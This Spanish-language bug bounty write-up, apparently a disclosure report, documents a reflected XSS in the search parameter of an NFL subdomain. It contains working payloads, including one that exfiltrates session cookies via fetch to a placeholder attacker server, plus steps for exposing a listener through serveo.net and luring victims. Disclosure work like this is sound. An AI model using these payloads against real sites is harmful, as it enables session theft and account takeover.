# NFL: XSS Reflejado en el Parámetro de Búsqueda URL

[English (EN)](../../en/bounties/nfl-xss-search-query.md)

## Introducción

Este informe documenta una vulnerabilidad de **Cross-Site Scripting Reflejado (XSS)** descubierta en el dominio público de la NFL `hbcutournament.nfl.com`. La vulnerabilidad reside en el parámetro de la página de resultados de búsqueda, que procesa incorrectamente la entrada suministrada por el usuario sin el saneamiento adecuado, permitiendo la ejecución de código JavaScript arbitrario.

---

## 🔍 Pruebas de Búsqueda

El primer paso fue probar la reflexión en la funcionalidad de búsqueda en los siguientes endpoints:

```html
https://hbcutournament.nfl.com/resources?q=
https://hbcutournament.nfl.com/blogs?q=
```

Observé que la aplicación no sanea ni codifica correctamente la entrada pasada a través del parámetro `?q=`, lo que permite la inyección en el contexto del navegador.

---

## 🏗️ Inyección HTML

Para confirmar la vulnerabilidad, primero intenté una inyección HTML simple para ver si la entrada se renderizaba directamente en el DOM.

**Payload:**
```HTML
<h1>Esta es una prueba de inyección HTML</h1> --- Esto es un texto normal.
```

![Inyección HTML NFL](../../assets/images/nfl/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20HTML%20Injection.png)

El resultado confirmó que la aplicación estaba renderizando etiquetas HTML crudas proporcionadas a través del parámetro de la URL.

---

## 🚨 Primer Alert (XSS Reflejado)

Tras confirmar la inyección HTML, pasé a la ejecución de JavaScript. Después de probar varios vectores, descubrí que la etiqueta `<img>` activa eficazmente la ejecución a través del evento `onerror`.

**Payload:**
```HTML
<img/src/onerror=alert(8)>
```

**URL Maliciosa:**
`https://hbcutournament.nfl.com/resources?q=<img/src/onerror=alert(8)>`

![Alerta 1 NFL](../../assets/images/nfl/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Alert%201.png)

---

## 🚀 Exploit Final (Exfiltración de Cookies)

El objetivo final era demostrar un impacto crítico. Diseñé un payload para exfiltrar las cookies de sesión a un servidor controlado por el atacante.

**Payload:**
```html
<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>
```

Al engañar a un usuario autenticado para que haga clic en este enlace, un atacante podría robar sus cookies de sesión y lograr el acceso a su cuenta.

![Exfiltración de Cookies NFL](../../assets/images/nfl/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration.png)

Las cookies exfiltradas se recibieron con éxito en el servidor del atacante:

![Resultado de Exfiltración de Cookies NFL](../../assets/images/nfl/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration%20Result.png)

---

## 🎯 Pasos para Reproducir

1. **Iniciar un Servidor Web Local**:
   ```bash
   python3 -m http.server 8000
   ```

2. **Exponer el Servidor (ej. vía Serveo)**:
   ```bash
   ssh -R 80:localhost:8000 serveo.net
   ```

3. **Construir la URL Maliciosa**:
   Reemplaza `YOUR-WEB-SERVER` por la URL pública generada en el payload:
   `https://hbcutournament.nfl.com/resources?q=<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>`

4. **Interacción de la Víctima**:
   Cuando un usuario autenticado visita la URL, sus cookies se envían al servidor del atacante.

---

## 🤝 Detalle de Colaboración

Esta investigación fue realizada en una **colaboración al 50%** entre **{{ site.researchers.ivan.name }}** y **{{ site.researchers.diego.name }}**. Ambos investigadores contribuyeron equitativamente al descubrimiento, explotación y documentación de esta vulnerabilidad.

---

## 🏁 Investigadores y Contacto

**{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
**{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
